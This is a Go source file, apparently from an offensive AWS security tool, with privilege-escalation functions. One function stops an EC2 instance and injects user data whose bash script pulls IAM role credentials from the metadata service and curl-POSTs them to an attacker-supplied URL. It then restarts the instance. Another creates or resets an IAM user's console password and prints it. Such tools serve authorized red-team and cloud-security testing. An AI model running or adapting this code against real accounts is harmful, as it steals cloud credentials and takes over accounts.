package awsdata

import (
	"fmt"
	"time"

	"github.com/aws/aws-sdk-go/aws"
	"github.com/aws/aws-sdk-go/aws/session"
	"github.com/aws/aws-sdk-go/service/ec2"
	"github.com/drk1wi/Modlishka/log"
)

func PrivescUserdata(sess *session.Session, instanceID string, payload string) {

	StopInstance(sess, instanceID)
	time.Sleep(30 * time.Second)

	//userdata payload to extract metadata
	userData := fmt.Sprintf(`Content-Type: multipart/mixed; boundary="//"
MIME-Version: 1.0

--//
Content-Type: text/cloud-config; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="cloud-config.txt"

#cloud-config
cloud_final_modules:
- [scripts-user, always]

--//
Content-Type: text/x-shellscript; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="userdata.txt"

#!/bin/bash
ROLE=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials)
META=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE)
curl -X POST -d "$META" %s
--//`, payload)

	//dataEnc := base64.StdEncoding.EncodeToString([]byte(userData))

	input := &ec2.ModifyInstanceAttributeInput{
		InstanceId: aws.String(instanceID),
		UserData: &ec2.BlobAttributeValue{
			Value: []byte(userData),
		},
	}
	attrib := ModifyInstanceAttribute(sess, input)
	if attrib {
		log.Infof("Modifying Instance Attribute UserData on %v", instanceID)
		StartInstance(sess, instanceID)
	}
}

func PrivescCreateLoginProfile(sess *session.Session, user string, t string) {
	rando := SetTrackingAction(t, "loginprofile-privesc")
	profile, password := CreateLoginProfile(sess, user)
	if profile != nil {
		fmt.Println("User: " + user)
		fmt.Println("Password: " + password + "\n")
		fmt.Println("UA Tracking: exec-env/" + rando)

	} else {
		fmt.Println("\nProfile exists, Updating instead..")
		_, password := UpdateLoginProfile(sess, user)
		fmt.Println("User: " + user)
		fmt.Println("Password: " + password + "\n")
		fmt.Println("UA Tracking: exec-env/" + rando)
	}

}

func PrivescAdminPermissions(sess *session.Session, user string, t string) {
	rando := SetTrackingAction(t, "adminperms-privesc")

	policies := ListUserPolicies(sess, user)
	for _, p := range policies.PolicyNames {
		fmt.Println(p)
	}
	fmt.Println("UA Tracking: exec-env/" + rando)
}
